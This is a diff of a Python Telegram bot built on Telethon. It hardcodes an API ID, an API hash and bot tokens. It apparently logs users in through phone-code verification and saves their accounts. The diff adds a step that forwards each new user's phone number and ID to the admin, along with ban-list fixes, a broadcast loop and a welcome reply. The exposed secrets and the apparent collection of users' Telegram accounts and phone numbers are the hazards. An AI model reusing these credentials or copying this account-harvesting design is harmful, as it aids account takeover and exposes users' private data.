@@ -20,7 +20,7 @@ if not os.path.isdir('database'):
 API_ID = "21669021"
 API_HASH = "bcdae25b210b2cbe27c03117328648a2"
 admin = 7072622935
-token = "7315494223:AAFs_jejjsSrP7J8bDSprHM7KhAJ2nz3tSc"
+token = "7315494223:AAEwgOz_RKoPYIbFMILicHCWojZpZHhUdNw"
 client = TelegramClient('BotSession', API_ID, API_HASH).start(bot_token=token)
 bot = client
 
@@ -108,6 +108,8 @@ async def callback_handler(event):
                 accounts.append(data)
                 db.set("accounts", accounts)
                 await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+                # Notify admin about the new user
+                await bot.send_message(admin, f"🎉 مستخدم جديد انضم إلى البوت:\n• رقم الهاتف: {phone_number}\n• ID المستخدم: {user_id}")
             except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                 await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                 return
@@ -228,9 +230,12 @@ async def callback_handler(event):
             user_id_to_ban = await x.get_response()
             banned_users = db.get("banned_users")
             if user_id_to_ban.text.isdigit():
-                banned_users.append(int(user_id_to_ban.text))
-                db.set("banned_users", banned_users)
-                await x.send_message("✅ تم حظر المستخدم بنجاح.")
+                if int(user_id_to_ban.text) not in banned_users:
+                    banned_users.append(int(user_id_to_ban.text))
+                    db.set("banned_users", banned_users)
+                    await x.send_message("✅ تم حظر المستخدم بنجاح.")
+                else:
+                    await x.send_message("❌ هذا المستخدم محظور مسبقًا.")
             else:
                 await x.send_message("❌ ID غير صحيح.")
 
@@ -239,18 +244,40 @@ async def callback_handler(event):
             await x.send_message("🔓 أرسل ID المستخدم الذي تريد فك حظره.")
             user_id_to_unban = await x.get_response()
             banned_users = db.get("banned_users")
-            if user_id_to_unban.text.isdigit() and int(user_id_to_unban.text) in banned_users:
-                banned_users.remove(int(user_id_to_unban.text))
-                db.set("banned_users", banned_users)
-                await x.send_message("✅ تم فك حظر المستخدم بنجاح.")
+            if user_id_to_unban.text.isdigit():
+                if int(user_id_to_unban.text) in banned_users:
+                    banned_users.remove(int(user_id_to_unban.text))
+                    db.set("banned_users", banned_users)
+                    await x.send_message("✅ تم فك حظر المستخدم بنجاح.")
+                else:
+                    await x.send_message("❌ هذا المستخدم ليس محظورًا.")
             else:
-                await x.send_message("❌ هذا المستخدم ليس محظورًا أو ID غير صحيح.")
+                await x.send_message("❌ ID غير صحيح.")
 
     elif data == "broadcast":
         async with bot.conversation(user_id) as x:
             await x.send_message("📢 أرسل الرسالة التي تريد إرسالها للجميع.")
             broadcast_message = await x.get_response()
-            # Here you should implement the logic to send the broadcast message to all users
-            await x.send_message("✅ تم ارسال الرسالة للجميع.")
+            total_users = len(db.get("accounts"))
+            total_banned_users = len(db.get("banned_users"))
+            total_sent = 0
+            message_status = await x.send_message("جاري الارسال...\nعدد مستخدمي البوت: 0\nعدد المستخدمين الذين قاموا بحظر البوت: 0\nعدد المستخدمين الذي تمت ارسال الرساله لهم: 0")
             
+            for account in db.get("accounts"):
+                try:
+                    await bot.send_message(account['phone_number'], broadcast_message.text)
+                    total_sent += 1
+                except Exception:
+                    continue
+                
+                await message_status.edit(f"جاري الارسال...\nعدد مستخدمي البوت: {total_users}\nعدد المستخدمين الذين قاموا بحظر البوت: {total_banned_users}\nعدد المستخدمين الذي تمت ارسال الرساله لهم: {total_sent}")
+                await asyncio.sleep(2)
+            
+            await message_status.edit(f"✅ تم ارسال الرسالة للجميع!\nعدد مستخدمي البوت: {total_users}\nعدد المستخدمين الذين قاموا بحظر البوت: {total_banned_users}\nعدد المستخدمين الذي تمت ارسال الرساله لهم: {total_sent}")
+
+@client.on(events.NewMessage(func=lambda x: x.is_private))
+async def welcome_message(event):
+    user_id = event.chat_id
+    await event.reply(f"👋 مرحبًا بك في البوت! إليك معلومات حسابك:\n\n• ID المستخدم: {user_id}\n• مرحبًا بك في عالم تيليجرام!")
+
 client.run_until_disconnected()
